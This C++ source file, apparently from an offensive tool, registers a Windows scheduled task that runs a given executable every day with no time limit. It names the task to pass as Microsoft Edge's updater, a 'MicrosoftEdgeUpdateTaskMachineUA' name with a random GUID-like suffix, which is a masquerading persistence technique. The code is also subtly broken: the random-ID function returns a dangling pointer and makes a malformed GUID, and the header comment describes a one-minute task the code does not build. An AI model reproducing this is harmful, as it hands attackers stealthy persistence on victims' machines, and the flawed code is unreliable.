/********************************************************************
 This sample schedules a task to start the program 1 minute from the
 time the task is registered. 
********************************************************************/

#include <schtask.h>
#include <combaseapi.h>
#include <oleauto.h>
#include "debug.h"
#include "utils.h"
#include "constants.h"
#include <time.h>

using namespace std;

// Random ID, in the format below:
// {8F76EDCD-8202-4830-BAC5-5128155FAB4E}
LPCWSTR gen_random() {
    srand(time(NULL));
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::string tmp_s;
    tmp_s.reserve(36);

    tmp_s += "{";
    // First 7-char chunk
    for (int i = 0; i < 7; i++) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }
    tmp_s += "-";

    // 3 middle 4-char chunks
    for (int i = 0; i < 3; i++) {
        for (int i = 0; i < 4; i++) {
            tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
        }
        tmp_s += "-";
    }

    // Last 12-char chunk
    for (int i = 0; i < 12; i++) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    tmp_s += "}";

    std::wstring stemp = std::wstring(tmp_s.begin(), tmp_s.end());
    LPCWSTR sw = stemp.c_str();
    
    return sw;
}

// Creates a daily scheduled task that executes the executable at exePath.
// Exe path should be absolute filepath.
// timeToRunDaily runs it everyday at this time; it should be in the format: "HH:MM:SS"
int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
    //  ------------------------------------------------------
    //  Initialize COM.
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCoInitializeEx failed: %x", hr );
        return 1;
    }

    //  Set general COM security levels.
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCoInitializeSecurity failed: %x", hr );
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Create a name for the task.
    // MicrosoftEdgeUpdateTaskMachineUA{8F76EDCD-8202-4830-BAC5-5128155FAB4E}
    LPCWSTR wszTaskName = toWide(SCHEDULED_TASK_NAME);
    LPCWSTR randomID = gen_random();
    std::wstring df_concat = std::wstring(wszTaskName) + randomID;
    wszTaskName = df_concat.c_str();

    wstring wstrExecutablePath = exePath;

    //  ------------------------------------------------------
    //  Create an instance of the Task Service. 
    ITaskService *pService = NULL;
    hr = CoCreateInstance( CLSID_TaskScheduler,
                           NULL,
                           CLSCTX_INPROC_SERVER,
                           IID_ITaskService,
                           (void**)&pService );  
    if (FAILED(hr))
    {
        DEBUG_PRINTF("Failed to create an instance of ITaskService: %x", hr);
        CoUninitialize();
        return 1;
    }
        
    //  Connect to the task service.
    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("ITaskService::Connect failed: %x", hr );
        pService->Release();
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Get the pointer to the root task folder.  This folder will hold the
    //  new task that is registered.
    ITaskFolder *pRootFolder = NULL;
    hr = pService->GetFolder( _bstr_t( L"\\") , &pRootFolder );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("Cannot get Root folder pointer: %x", hr );
        pService->Release();
        CoUninitialize();
        return 1;
    }
    
    //  If the same task exists, remove it.
    pRootFolder->DeleteTask( _bstr_t( wszTaskName), 0  );
    
    //  Create the task definition object to create the task.
    ITaskDefinition *pTask = NULL;
    hr = pService->NewTask( 0, &pTask );

    pService->Release();  // COM clean up.  Pointer is no longer used.
    if (FAILED(hr))
    {
        DEBUG_PRINTF("Failed to CoCreate an instance of the TaskService class: %x", hr);
        pRootFolder->Release();
        CoUninitialize();
        return 1;
    }
        
    //  ------------------------------------------------------
    //  Get the registration info for setting the identification.
    IRegistrationInfo *pRegInfo= NULL;
    hr = pTask->get_RegistrationInfo( &pRegInfo );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot get identification pointer: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    
    // Uncomment for ability to add author name if needed
    // hr = pRegInfo->put_Author( L"Author Name" );    
    pRegInfo->Release();  
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot put identification info: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Create the principal for the task - these credentials
    //  are overwritten with the credentials passed to RegisterTaskDefinition
    IPrincipal *pPrincipal = NULL;
    hr = pTask->get_Principal( &pPrincipal );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot get principal pointer: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    
    //  Set up principal logon type to interactive logon
    hr = pPrincipal->put_LogonType( TASK_LOGON_INTERACTIVE_TOKEN );
    pPrincipal->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot put principal info: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }  

    //  ------------------------------------------------------
    //  Create the settings for the task
    ITaskSettings *pSettings = NULL;
    hr = pTask->get_Settings( &pSettings );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot get settings pointer: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    
    //  Set setting values for the task.  
    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot put start setting information: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    // Set the power settings for the task.
    hr = pSettings->put_DisallowStartIfOnBatteries( VARIANT_FALSE );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot put power setting information: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

     // Set the execution time limit settings for the task.
    hr = pSettings->put_ExecutionTimeLimit( SysAllocString(L"PT0S") );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot put execution time limit setting information: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    // Set the idle settings for the task.
    IIdleSettings *pIdleSettings = NULL;
    hr = pSettings->get_IdleSettings( &pIdleSettings );
    pSettings->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot get idle setting information: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pIdleSettings->put_WaitTimeout(SysAllocString(L"PT5M"));
    pIdleSettings->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot put idle setting information: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    

    //  ------------------------------------------------------
    //  Get the trigger collection to insert the logon trigger.
    ITriggerCollection *pTriggerCollection = NULL;
    hr = pTask->get_Triggers( &pTriggerCollection );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot get trigger collection: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Add the logon trigger to the task.
    ITrigger *pTrigger = NULL;    
    hr = pTriggerCollection->Create( TASK_TRIGGER_DAILY, &pTrigger );     
    pTriggerCollection->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot create trigger: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IDailyTrigger *pDailyTrigger = NULL;
    hr = pTrigger->QueryInterface(IID_IDailyTrigger, (void**) &pDailyTrigger);
    pTrigger->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nQueryInterface call failed for IDailyTrigger: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pDailyTrigger->put_Id( _bstr_t( L"Trigger1" ) );
    if( FAILED(hr) )
        DEBUG_PRINTF("\nCannot put trigger ID: %x", hr);

    hr = pDailyTrigger->put_StartBoundary( _bstr_t(L"2000-01-01T") + _bstr_t(timeToRunDaily) );
    pDailyTrigger->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot add start boundary to trigger: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    

    //  ------------------------------------------------------
    //  Add an action to the task. This task will execute the program.     
    IActionCollection *pActionCollection = NULL;

    //  Get the task action collection pointer.
    hr = pTask->get_Actions( &pActionCollection );
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot get Task collection pointer: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    
    //  Create the action, specifying that it is an executable action.
    IAction *pAction = NULL;
    hr = pActionCollection->Create( TASK_ACTION_EXEC, &pAction );
    pActionCollection->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot create the action: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IExecAction *pExecAction = NULL;
    //  QI for the executable task pointer.
    hr = pAction->QueryInterface( 
        IID_IExecAction, (void**) &pExecAction );
    pAction->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nQueryInterface call failed for IExecAction: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Set the path of the executable.
    hr = pExecAction->put_Path( _bstr_t( wstrExecutablePath.c_str() ) );
    pExecAction->Release();
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nCannot put action path: %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }  
    
    //  ------------------------------------------------------
    //  Save the task in the root folder.
    IRegisteredTask *pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t( wszTaskName ),
            pTask,
            TASK_CREATE_OR_UPDATE, 
            _variant_t(), 
            _variant_t(), 
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegisteredTask);
    if( FAILED(hr) )
    {
        DEBUG_PRINTF("\nError saving the Task : %x", hr );
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    
    DEBUG_PRINTF("\n Success! Task successfully registered. " );

    //  Clean up.
    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
    return 0;
}